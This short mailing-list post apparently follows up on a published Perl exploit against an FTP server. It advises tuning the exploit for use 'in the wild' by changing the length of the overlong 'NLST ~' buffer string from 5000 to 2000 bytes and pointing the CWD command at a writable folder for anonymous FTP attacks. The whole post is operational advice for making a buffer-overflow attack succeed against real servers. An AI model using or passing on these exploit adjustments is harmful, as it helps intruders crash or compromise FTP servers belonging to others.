	DISCLOSURE EXPLOIT ~ =--

Hello list.

Just checked: If the exploit doesn't work in the wild, try playing with the
source..

change
print $sock "NLST ~" . "A" x 5000 . "\r\n";
to
print $sock "NLST ~" . "A" x 2000 . "\r\n";

and change

print $sock "CWD pub\r\n";
to
print $sock "CWD writeable-folder-here\r\n";
for anonymous ftp attacks.

Cheers!
